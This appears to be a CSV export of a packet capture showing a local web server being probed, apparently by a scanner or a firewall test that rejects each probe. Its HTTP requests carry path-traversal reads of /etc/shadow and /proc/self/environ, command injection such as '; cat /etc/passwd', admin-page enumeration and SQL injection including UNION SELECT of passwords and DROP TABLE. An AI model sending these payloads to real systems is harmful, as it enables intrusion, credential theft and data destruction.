"No.","Time","Source","Destination","Protocol","Length","Info"
"602","131.670444","::1","::1","TCP","86","80  >  45546 [FIN, ACK] Seq=433 Ack=115 Win=65536 Len=0 TSval=1131748971 TSecr=1131748971"
"603","131.670457","::1","::1","TCP","86","45546  >  80 [ACK] Seq=115 Ack=434 Win=65536 Len=0 TSval=1131748971 TSecr=1131748971"
"604","133.683965","::1","::1","TCP","94","45550  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131750984 TSecr=0 WS=128"
"605","133.683982","::1","::1","TCP","94","80  >  45550 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131750984 TSecr=1131750984 WS=128"
"606","133.683996","::1","::1","TCP","86","45550  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131750984 TSecr=1131750984"
"607","133.684030","::1","::1","HTTP","196","GET /download.php?file=../../../etc/shadow HTTP/1.1 "
"608","133.684066","::1","::1","TCP","86","80  >  45550 [ACK] Seq=1 Ack=111 Win=65408 Len=0 TSval=1131750984 TSecr=1131750984"
"609","133.684320","::1","::1","HTTP","518","HTTP/1.1 404 Not Found  (text/html)"
"610","133.684336","::1","::1","TCP","86","45550  >  80 [ACK] Seq=111 Ack=433 Win=65152 Len=0 TSval=1131750984 TSecr=1131750984"
"611","133.684435","::1","::1","TCP","86","45550  >  80 [FIN, ACK] Seq=111 Ack=433 Win=65536 Len=0 TSval=1131750985 TSecr=1131750984"
"612","133.684492","::1","::1","TCP","86","80  >  45550 [FIN, ACK] Seq=433 Ack=112 Win=65536 Len=0 TSval=1131750985 TSecr=1131750985"
"613","133.684507","::1","::1","TCP","86","45550  >  80 [ACK] Seq=112 Ack=434 Win=65536 Len=0 TSval=1131750985 TSecr=1131750985"
"614","134.700329","::1","::1","TCP","94","45552  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131752000 TSecr=0 WS=128"
"615","134.700347","::1","::1","TCP","94","80  >  45552 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131752000 TSecr=1131752000 WS=128"
"616","134.700361","::1","::1","TCP","86","45552  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131752001 TSecr=1131752000"
"617","134.700394","::1","::1","HTTP","204","GET /download.php?file=../../../../../../etc/hosts HTTP/1.1 "
"618","134.700429","::1","::1","TCP","86","80  >  45552 [ACK] Seq=1 Ack=119 Win=65408 Len=0 TSval=1131752001 TSecr=1131752001"
"619","134.700676","::1","::1","HTTP","518","HTTP/1.1 404 Not Found  (text/html)"
"620","134.700691","::1","::1","TCP","86","45552  >  80 [ACK] Seq=119 Ack=433 Win=65152 Len=0 TSval=1131752001 TSecr=1131752001"
"621","134.700788","::1","::1","TCP","86","45552  >  80 [FIN, ACK] Seq=119 Ack=433 Win=65536 Len=0 TSval=1131752001 TSecr=1131752001"
"622","134.700834","::1","::1","TCP","86","80  >  45552 [FIN, ACK] Seq=433 Ack=120 Win=65536 Len=0 TSval=1131752001 TSecr=1131752001"
"623","134.700847","::1","::1","TCP","86","45552  >  80 [ACK] Seq=120 Ack=434 Win=65536 Len=0 TSval=1131752001 TSecr=1131752001"
"624","135.711684","::1","::1","TCP","94","45564  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131753012 TSecr=0 WS=128"
"625","135.711702","::1","::1","TCP","94","80  >  45564 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131753012 TSecr=1131753012 WS=128"
"626","135.711716","::1","::1","TCP","86","45564  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131753012 TSecr=1131753012"
"627","135.711746","::1","::1","HTTP","218","GET /download.php?file=../../../../../var/log/apache2/access.log HTTP/1.1 "
"628","135.711785","::1","::1","TCP","86","80  >  45564 [ACK] Seq=1 Ack=133 Win=65408 Len=0 TSval=1131753012 TSecr=1131753012"
"629","135.712040","::1","::1","HTTP","518","HTTP/1.1 404 Not Found  (text/html)"
"630","135.712053","::1","::1","TCP","86","45564  >  80 [ACK] Seq=133 Ack=433 Win=65152 Len=0 TSval=1131753012 TSecr=1131753012"
"631","135.712146","::1","::1","TCP","86","45564  >  80 [FIN, ACK] Seq=133 Ack=433 Win=65536 Len=0 TSval=1131753012 TSecr=1131753012"
"632","135.712219","::1","::1","TCP","86","80  >  45564 [FIN, ACK] Seq=433 Ack=134 Win=65536 Len=0 TSval=1131753012 TSecr=1131753012"
"633","135.712233","::1","::1","TCP","86","45564  >  80 [ACK] Seq=134 Ack=434 Win=65536 Len=0 TSval=1131753012 TSecr=1131753012"
"634","138.723917","::1","::1","TCP","94","43988  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131756024 TSecr=0 WS=128"
"635","138.723935","::1","::1","TCP","94","80  >  43988 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131756024 TSecr=1131756024 WS=128"
"636","138.723950","::1","::1","TCP","86","43988  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131756024 TSecr=1131756024"
"637","138.723984","::1","::1","HTTP","206","GET /download.php?file=../../../../proc/self/environ HTTP/1.1 "
"638","138.724019","::1","::1","TCP","86","80  >  43988 [ACK] Seq=1 Ack=121 Win=65408 Len=0 TSval=1131756024 TSecr=1131756024"
"639","138.724485","::1","::1","HTTP","518","HTTP/1.1 404 Not Found  (text/html)"
"640","138.724531","::1","::1","TCP","86","43988  >  80 [ACK] Seq=121 Ack=433 Win=65152 Len=0 TSval=1131756025 TSecr=1131756025"
"641","138.724858","::1","::1","TCP","86","43988  >  80 [FIN, ACK] Seq=121 Ack=433 Win=65536 Len=0 TSval=1131756025 TSecr=1131756025"
"642","138.724950","::1","::1","TCP","86","80  >  43988 [FIN, ACK] Seq=433 Ack=122 Win=65536 Len=0 TSval=1131756025 TSecr=1131756025"
"643","138.724974","::1","::1","TCP","86","43988  >  80 [ACK] Seq=122 Ack=434 Win=65536 Len=0 TSval=1131756025 TSecr=1131756025"
"644","140.739897","::1","::1","TCP","94","43996  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131758040 TSecr=0 WS=128"
"645","140.739915","::1","::1","TCP","94","80  >  43996 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131758040 TSecr=1131758040 WS=128"
"646","140.739930","::1","::1","TCP","86","43996  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131758040 TSecr=1131758040"
"647","140.739966","::1","::1","HTTP","210","GET /download.php?file=../../../etc/apache2/apache2.conf HTTP/1.1 "
"648","140.740005","::1","::1","TCP","86","80  >  43996 [ACK] Seq=1 Ack=125 Win=65408 Len=0 TSval=1131758040 TSecr=1131758040"
"649","140.740309","::1","::1","HTTP","518","HTTP/1.1 404 Not Found  (text/html)"
"650","140.740326","::1","::1","TCP","86","43996  >  80 [ACK] Seq=125 Ack=433 Win=65152 Len=0 TSval=1131758040 TSecr=1131758040"
"651","140.740440","::1","::1","TCP","86","43996  >  80 [FIN, ACK] Seq=125 Ack=433 Win=65536 Len=0 TSval=1131758041 TSecr=1131758040"
"652","140.740484","::1","::1","TCP","86","80  >  43996 [FIN, ACK] Seq=433 Ack=126 Win=65536 Len=0 TSval=1131758041 TSecr=1131758041"
"653","140.740501","::1","::1","TCP","86","43996  >  80 [ACK] Seq=126 Ack=434 Win=65536 Len=0 TSval=1131758041 TSecr=1131758041"
"654","141.179520","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive] 20201  >  45674 [ACK] Seq=11351 Ack=1093 Win=512 Len=0 TSval=2287088068 TSecr=2287072993"
"655","141.179523","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive] 45674  >  20201 [ACK] Seq=1092 Ack=11352 Win=512 Len=0 TSval=2287088068 TSecr=2287072993"
"656","141.179539","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive ACK] 45674  >  20201 [ACK] Seq=1093 Ack=11352 Win=512 Len=0 TSval=2287088068 TSecr=2287072993"
"657","141.179539","127.0.0.1","127.0.0.1","TCP","66","[TCP Dup ACK 567#1] 20201  >  45674 [ACK] Seq=11352 Ack=1093 Win=512 Len=0 TSval=2287088068 TSecr=2287072993"
"658","142.760713","::1","::1","TCP","94","44004  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131760061 TSecr=0 WS=128"
"659","142.760730","::1","::1","TCP","94","80  >  44004 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131760061 TSecr=1131760061 WS=128"
"660","142.760744","::1","::1","TCP","86","44004  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131760061 TSecr=1131760061"
"661","142.760782","::1","::1","HTTP","199","GET /ping.php?host=127.0.0.1; cat /etc/passwd HTTP/1.1 "
"662","142.760816","::1","::1","TCP","86","80  >  44004 [ACK] Seq=1 Ack=114 Win=65408 Len=0 TSval=1131760061 TSecr=1131760061"
"663","142.761001","::1","::1","HTTP","626","HTTP/1.1 400 Bad Request  (text/html)"
"664","142.761025","::1","::1","TCP","86","44004  >  80 [ACK] Seq=114 Ack=541 Win=65024 Len=0 TSval=1131760061 TSecr=1131760061"
"665","142.761098","::1","::1","TCP","86","44004  >  80 [FIN, ACK] Seq=114 Ack=541 Win=65536 Len=0 TSval=1131760061 TSecr=1131760061"
"666","142.761106","::1","::1","TCP","86","80  >  44004 [FIN, ACK] Seq=541 Ack=115 Win=65536 Len=0 TSval=1131760061 TSecr=1131760061"
"667","142.761120","::1","::1","TCP","86","44004  >  80 [ACK] Seq=115 Ack=542 Win=65536 Len=0 TSval=1131760061 TSecr=1131760061"
"668","145.779357","::1","::1","TCP","94","44006  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131763079 TSecr=0 WS=128"
"669","145.779406","::1","::1","TCP","94","80  >  44006 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131763080 TSecr=1131763079 WS=128"
"670","145.779433","::1","::1","TCP","86","44006  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131763080 TSecr=1131763080"
"671","145.779509","::1","::1","HTTP","185","GET /system.php?cmd=ls | whoami HTTP/1.1 "
"672","145.779547","::1","::1","TCP","86","80  >  44006 [ACK] Seq=1 Ack=100 Win=65408 Len=0 TSval=1131763080 TSecr=1131763080"
"673","145.779725","::1","::1","HTTP","626","HTTP/1.1 400 Bad Request  (text/html)"
"674","145.779740","::1","::1","TCP","86","44006  >  80 [ACK] Seq=100 Ack=541 Win=65024 Len=0 TSval=1131763080 TSecr=1131763080"
"675","145.779823","::1","::1","TCP","86","80  >  44006 [FIN, ACK] Seq=541 Ack=100 Win=65536 Len=0 TSval=1131763080 TSecr=1131763080"
"676","145.779832","::1","::1","TCP","86","44006  >  80 [FIN, ACK] Seq=100 Ack=542 Win=65536 Len=0 TSval=1131763080 TSecr=1131763080"
"677","145.779843","::1","::1","TCP","86","80  >  44006 [ACK] Seq=542 Ack=101 Win=65536 Len=0 TSval=1131763080 TSecr=1131763080"
"678","155.795147","::1","::1","TCP","94","56352  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131773095 TSecr=0 WS=128"
"679","155.795163","::1","::1","TCP","94","80  >  56352 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131773095 TSecr=1131773095 WS=128"
"680","155.795176","::1","::1","TCP","86","56352  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131773095 TSecr=1131773095"
"681","155.795206","::1","::1","HTTP","165","GET /admin/ HTTP/1.1 "
"682","155.795238","::1","::1","TCP","86","80  >  56352 [ACK] Seq=1 Ack=80 Win=65408 Len=0 TSval=1131773095 TSecr=1131773095"
"683","155.795687","::1","::1","HTTP","993","HTTP/1.1 200 OK  (text/html)"
"684","155.795701","::1","::1","TCP","86","56352  >  80 [ACK] Seq=80 Ack=908 Win=64640 Len=0 TSval=1131773096 TSecr=1131773096"
"685","155.795810","::1","::1","TCP","86","56352  >  80 [FIN, ACK] Seq=80 Ack=908 Win=65536 Len=0 TSval=1131773096 TSecr=1131773096"
"686","155.795856","::1","::1","TCP","86","80  >  56352 [FIN, ACK] Seq=908 Ack=81 Win=65536 Len=0 TSval=1131773096 TSecr=1131773096"
"687","155.795869","::1","::1","TCP","86","56352  >  80 [ACK] Seq=81 Ack=909 Win=65536 Len=0 TSval=1131773096 TSecr=1131773096"
"688","156.283530","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive] 20201  >  45674 [ACK] Seq=11351 Ack=1093 Win=512 Len=0 TSval=2287103172 TSecr=2287088068"
"689","156.283544","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive ACK] 45674  >  20201 [ACK] Seq=1093 Ack=11352 Win=512 Len=0 TSval=2287103172 TSecr=2287088068"
"690","156.283563","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive] 45674  >  20201 [ACK] Seq=1092 Ack=11352 Win=512 Len=0 TSval=2287103172 TSecr=2287088068"
"691","156.283569","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive ACK] 20201  >  45674 [ACK] Seq=11352 Ack=1093 Win=512 Len=0 TSval=2287103172 TSecr=2287103172"
"692","157.806953","::1","::1","TCP","94","56356  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131775107 TSecr=0 WS=128"
"693","157.806970","::1","::1","TCP","94","80  >  56356 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131775107 TSecr=1131775107 WS=128"
"694","157.806984","::1","::1","TCP","86","56356  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131775107 TSecr=1131775107"
"695","157.807021","::1","::1","HTTP","173","GET /administrator/ HTTP/1.1 "
"696","157.807056","::1","::1","TCP","86","80  >  56356 [ACK] Seq=1 Ack=88 Win=65408 Len=0 TSval=1131775107 TSecr=1131775107"
"697","157.807312","::1","::1","HTTP","518","HTTP/1.1 404 Not Found  (text/html)"
"698","157.807327","::1","::1","TCP","86","56356  >  80 [ACK] Seq=88 Ack=433 Win=65152 Len=0 TSval=1131775107 TSecr=1131775107"
"699","157.807439","::1","::1","TCP","86","56356  >  80 [FIN, ACK] Seq=88 Ack=433 Win=65536 Len=0 TSval=1131775108 TSecr=1131775107"
"700","157.807489","::1","::1","TCP","86","80  >  56356 [FIN, ACK] Seq=433 Ack=89 Win=65536 Len=0 TSval=1131775108 TSecr=1131775108"
"701","157.807505","::1","::1","TCP","86","56356  >  80 [ACK] Seq=89 Ack=434 Win=65536 Len=0 TSval=1131775108 TSecr=1131775108"
"702","158.819782","::1","::1","TCP","94","45432  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131776120 TSecr=0 WS=128"
"703","158.819798","::1","::1","TCP","94","80  >  45432 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131776120 TSecr=1131776120 WS=128"
"704","158.819812","::1","::1","TCP","86","45432  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131776120 TSecr=1131776120"
"705","158.819844","::1","::1","HTTP","174","GET /admin/login.php HTTP/1.1 "
"706","158.819877","::1","::1","TCP","86","80  >  45432 [ACK] Seq=1 Ack=89 Win=65408 Len=0 TSval=1131776120 TSecr=1131776120"
"707","158.820148","::1","::1","HTTP","518","HTTP/1.1 404 Not Found  (text/html)"
"708","158.820161","::1","::1","TCP","86","45432  >  80 [ACK] Seq=89 Ack=433 Win=65152 Len=0 TSval=1131776120 TSecr=1131776120"
"709","158.820281","::1","::1","TCP","86","45432  >  80 [FIN, ACK] Seq=89 Ack=433 Win=65536 Len=0 TSval=1131776120 TSecr=1131776120"
"710","158.820347","::1","::1","TCP","86","80  >  45432 [FIN, ACK] Seq=433 Ack=90 Win=65536 Len=0 TSval=1131776120 TSecr=1131776120"
"711","158.820363","::1","::1","TCP","86","45432  >  80 [ACK] Seq=90 Ack=434 Win=65536 Len=0 TSval=1131776120 TSecr=1131776120"
"712","160.278678","127.0.0.1","127.0.0.1","TCP","74","37182  >  20202 [SYN] Seq=0 Win=65495 Len=0 MSS=65495 SACK_PERM TSval=2287107167 TSecr=0 WS=128"
"713","160.278700","127.0.0.1","127.0.0.1","TCP","74","20202  >  37182 [SYN, ACK] Seq=0 Ack=1 Win=65483 Len=0 MSS=65495 SACK_PERM TSval=2287107167 TSecr=2287107167 WS=128"
"714","160.278715","127.0.0.1","127.0.0.1","TCP","66","37182  >  20202 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=2287107167 TSecr=2287107167"
"715","160.278953","127.0.0.1","127.0.0.1","HTTP","430","GET /metrics HTTP/1.1 "
"716","160.278968","127.0.0.1","127.0.0.1","TCP","66","20202  >  37182 [ACK] Seq=1 Ack=365 Win=65152 Len=0 TSval=2287107167 TSecr=2287107167"
"717","160.279052","127.0.0.1","127.0.0.1","TCP","170","20202  >  37182 [PSH, ACK] Seq=1 Ack=365 Win=65536 Len=104 TSval=2287107167 TSecr=2287107167 [TCP segment of a reassembled PDU]"
"718","160.279074","127.0.0.1","127.0.0.1","TCP","66","37182  >  20202 [ACK] Seq=365 Ack=105 Win=65536 Len=0 TSval=2287107167 TSecr=2287107167"
"719","160.279086","127.0.0.1","127.0.0.1","TCP","109","20202  >  37182 [PSH, ACK] Seq=105 Ack=365 Win=65536 Len=43 TSval=2287107167 TSecr=2287107167 [TCP segment of a reassembled PDU]"
"720","160.279091","127.0.0.1","127.0.0.1","TCP","66","37182  >  20202 [ACK] Seq=365 Ack=148 Win=65536 Len=0 TSval=2287107167 TSecr=2287107167"
"721","160.279101","127.0.0.1","127.0.0.1","TCP","72","20202  >  37182 [PSH, ACK] Seq=148 Ack=365 Win=65536 Len=6 TSval=2287107167 TSecr=2287107167 [TCP segment of a reassembled PDU]"
"722","160.279105","127.0.0.1","127.0.0.1","TCP","66","37182  >  20202 [ACK] Seq=365 Ack=154 Win=65536 Len=0 TSval=2287107167 TSecr=2287107167"
"723","160.279129","127.0.0.1","127.0.0.1","TCP","23986","20202  >  37182 [PSH, ACK] Seq=154 Ack=365 Win=65536 Len=23920 TSval=2287107167 TSecr=2287107167 [TCP segment of a reassembled PDU]"
"724","160.279134","127.0.0.1","127.0.0.1","TCP","66","37182  >  20202 [ACK] Seq=365 Ack=24074 Win=52992 Len=0 TSval=2287107167 TSecr=2287107167"
"725","160.279143","127.0.0.1","127.0.0.1","TCP","68","20202  >  37182 [PSH, ACK] Seq=24074 Ack=365 Win=65536 Len=2 TSval=2287107167 TSecr=2287107167 [TCP segment of a reassembled PDU]"
"726","160.279146","127.0.0.1","127.0.0.1","TCP","66","37182  >  20202 [ACK] Seq=365 Ack=24076 Win=52992 Len=0 TSval=2287107167 TSecr=2287107167"
"727","160.279160","127.0.0.1","127.0.0.1","HTTP","71","HTTP/1.1 200 OK  (text/plain)"
"728","160.279163","127.0.0.1","127.0.0.1","TCP","66","37182  >  20202 [ACK] Seq=365 Ack=24081 Win=52992 Len=0 TSval=2287107167 TSecr=2287107167"
"729","163.836337","::1","::1","TCP","94","45444  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131781136 TSecr=0 WS=128"
"730","163.836354","::1","::1","TCP","94","80  >  45444 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131781136 TSecr=1131781136 WS=128"
"731","163.836369","::1","::1","TCP","86","45444  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131781137 TSecr=1131781136"
"732","163.836402","::1","::1","HTTP","220","GET /profile.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1 "
"733","163.836439","::1","::1","TCP","86","80  >  45444 [ACK] Seq=1 Ack=135 Win=65408 Len=0 TSval=1131781137 TSecr=1131781137"
"734","163.836617","::1","::1","HTTP","626","HTTP/1.1 400 Bad Request  (text/html)"
"735","163.836632","::1","::1","TCP","86","45444  >  80 [ACK] Seq=135 Ack=541 Win=65024 Len=0 TSval=1131781137 TSecr=1131781137"
"736","163.836694","::1","::1","TCP","86","45444  >  80 [FIN, ACK] Seq=135 Ack=541 Win=65536 Len=0 TSval=1131781137 TSecr=1131781137"
"737","163.836711","::1","::1","TCP","86","80  >  45444 [FIN, ACK] Seq=541 Ack=136 Win=65536 Len=0 TSval=1131781137 TSecr=1131781137"
"738","163.836725","::1","::1","TCP","86","45444  >  80 [ACK] Seq=136 Ack=542 Win=65536 Len=0 TSval=1131781137 TSecr=1131781137"
"739","166.849575","::1","::1","TCP","94","45460  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131784150 TSecr=0 WS=128"
"740","166.849591","::1","::1","TCP","94","80  >  45460 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131784150 TSecr=1131784150 WS=128"
"741","166.849606","::1","::1","TCP","86","45460  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131784150 TSecr=1131784150"
"742","166.849641","::1","::1","HTTP","233","GET /profile.php?id=1' UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1 "
"743","166.849673","::1","::1","TCP","86","80  >  45460 [ACK] Seq=1 Ack=148 Win=65408 Len=0 TSval=1131784150 TSecr=1131784150"
"744","166.849843","::1","::1","HTTP","626","HTTP/1.1 400 Bad Request  (text/html)"
"745","166.849859","::1","::1","TCP","86","45460  >  80 [ACK] Seq=148 Ack=541 Win=65024 Len=0 TSval=1131784150 TSecr=1131784150"
"746","166.849921","::1","::1","TCP","86","45460  >  80 [FIN, ACK] Seq=148 Ack=541 Win=65536 Len=0 TSval=1131784150 TSecr=1131784150"
"747","166.849936","::1","::1","TCP","86","80  >  45460 [FIN, ACK] Seq=541 Ack=149 Win=65536 Len=0 TSval=1131784150 TSecr=1131784150"
"748","166.849949","::1","::1","TCP","86","45460  >  80 [ACK] Seq=149 Ack=542 Win=65536 Len=0 TSval=1131784150 TSecr=1131784150"
"749","169.862429","::1","::1","TCP","94","60234  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131787163 TSecr=0 WS=128"
"750","169.862447","::1","::1","TCP","94","80  >  60234 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131787163 TSecr=1131787163 WS=128"
"751","169.862462","::1","::1","TCP","86","60234  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131787163 TSecr=1131787163"
"752","169.862494","::1","::1","HTTP","191","GET /profile.php?id=1' AND SLEEP(2)-- HTTP/1.1 "
"753","169.862528","::1","::1","TCP","86","80  >  60234 [ACK] Seq=1 Ack=106 Win=65408 Len=0 TSval=1131787163 TSecr=1131787163"
"754","169.862714","::1","::1","HTTP","626","HTTP/1.1 400 Bad Request  (text/html)"
"755","169.862726","::1","::1","TCP","86","60234  >  80 [ACK] Seq=106 Ack=541 Win=65024 Len=0 TSval=1131787163 TSecr=1131787163"
"756","169.862798","::1","::1","TCP","86","60234  >  80 [FIN, ACK] Seq=106 Ack=541 Win=65536 Len=0 TSval=1131787163 TSecr=1131787163"
"757","169.862806","::1","::1","TCP","86","80  >  60234 [FIN, ACK] Seq=541 Ack=107 Win=65536 Len=0 TSval=1131787163 TSecr=1131787163"
"758","169.862819","::1","::1","TCP","86","60234  >  80 [ACK] Seq=107 Ack=542 Win=65536 Len=0 TSval=1131787163 TSecr=1131787163"
"759","171.387514","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive] 20201  >  45674 [ACK] Seq=11351 Ack=1093 Win=512 Len=0 TSval=2287118276 TSecr=2287103172"
"760","171.387530","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive ACK] 45674  >  20201 [ACK] Seq=1093 Ack=11352 Win=512 Len=0 TSval=2287118276 TSecr=2287103172"
"761","171.387554","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive] 45674  >  20201 [ACK] Seq=1092 Ack=11352 Win=512 Len=0 TSval=2287118276 TSecr=2287103172"
"762","171.387575","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive ACK] 20201  >  45674 [ACK] Seq=11352 Ack=1093 Win=512 Len=0 TSval=2287118276 TSecr=2287118276"
"763","172.875947","::1","::1","TCP","94","60244  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131790176 TSecr=0 WS=128"
"764","172.875963","::1","::1","TCP","94","80  >  60244 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131790176 TSecr=1131790176 WS=128"
"765","172.875978","::1","::1","TCP","86","60244  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131790176 TSecr=1131790176"
"766","172.876013","::1","::1","HTTP","196","GET /profile.php?id=1'; DROP TABLE users-- HTTP/1.1 "
"767","172.876047","::1","::1","TCP","86","80  >  60244 [ACK] Seq=1 Ack=111 Win=65408 Len=0 TSval=1131790176 TSecr=1131790176"
"768","172.876218","::1","::1","HTTP","626","HTTP/1.1 400 Bad Request  (text/html)"
"769","172.876231","::1","::1","TCP","86","60244  >  80 [ACK] Seq=111 Ack=541 Win=65024 Len=0 TSval=1131790176 TSecr=1131790176"
"770","172.876300","::1","::1","TCP","86","60244  >  80 [FIN, ACK] Seq=111 Ack=541 Win=65536 Len=0 TSval=1131790176 TSecr=1131790176"
"771","172.876307","::1","::1","TCP","86","80  >  60244 [FIN, ACK] Seq=541 Ack=112 Win=65536 Len=0 TSval=1131790176 TSecr=1131790176"
"772","172.876321","::1","::1","TCP","86","60244  >  80 [ACK] Seq=112 Ack=542 Win=65536 Len=0 TSval=1131790176 TSecr=1131790176"
"773","175.483507","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive] 37182  >  20202 [ACK] Seq=364 Ack=24081 Win=65536 Len=0 TSval=2287122372 TSecr=2287107167"
"774","175.483530","127.0.0.1","127.0.0.1","TCP","66","[TCP Keep-Alive ACK] 20202  >  37182 [ACK] Seq=24081 Ack=365 Win=65536 Len=0 TSval=2287122372 TSecr=2287107167"
"775","176.888132","::1","::1","TCP","94","60248  >  80 [SYN] Seq=0 Win=65476 Len=0 MSS=65476 SACK_PERM TSval=1131794188 TSecr=0 WS=128"
"776","176.888151","::1","::1","TCP","94","80  >  60248 [SYN, ACK] Seq=0 Ack=1 Win=65464 Len=0 MSS=65476 SACK_PERM TSval=1131794188 TSecr=1131794188 WS=128"
"777","176.888165","::1","::1","TCP","86","60248  >  80 [ACK] Seq=1 Ack=1 Win=65536 Len=0 TSval=1131794188 TSecr=1131794188"
"778","176.888199","::1","::1","HTTP","193","GET /profile.php?id=1' OR 1=1 LIMIT 1-- HTTP/1.1 "
"779","176.888234","::1","::1","TCP","86","80  >  60248 [ACK] Seq=1 Ack=108 Win=65408 Len=0 TSval=1131794188 TSecr=1131794188"
"780","176.888420","::1","::1","HTTP","626","HTTP/1.1 400 Bad Request  (text/html)"
"781","176.888433","::1","::1","TCP","86","60248  >  80 [ACK] Seq=108 Ack=541 Win=65024 Len=0 TSval=1131794189 TSecr=1131794189"
